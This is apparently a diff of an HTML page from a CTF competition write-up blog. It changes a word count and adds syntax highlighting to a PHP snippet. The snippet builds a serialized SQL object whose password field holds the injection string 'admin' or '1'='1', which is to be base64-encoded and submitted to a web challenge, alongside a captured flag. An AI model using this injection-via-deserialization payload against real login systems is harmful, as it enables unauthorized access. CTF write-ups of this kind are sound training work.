@@ -494,7 +494,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    612
+                    685
                 </div>
                 
 
@@ -695,18 +695,18 @@ flag{8f62d75de5b51d69799790cdf2cf05d4}</code></pre>
     <span class="token punctuation">}</span></code></pre>
 <p>YToxOntzOjI6ImlwIjtzOjEyOiIxODMuMjM2LjAuOTEiO30=</p>
 <p>a:1:{s:2:”ip”;s:12:”183.236.0.91”;}</p>
-<pre class=" language-plain"><code class="language-plain"><?php
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
-class SQL {
+<span class="token keyword">class</span> <span class="token class-name">SQL</span> <span class="token punctuation">{</span>
 
-    public $table="users";
-    public $username="admin";
-    public $password="admin' or '1'='1";
-}
+    <span class="token keyword">public</span> <span class="token variable">$table</span><span class="token operator">=</span><span class="token string">"users"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"admin' or '1'='1"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-$SQL = new SQL();
+<span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-echo serialize($SQL);
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>再base64编码就行了</p>
 <p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web4.png" alt="图片"></p>
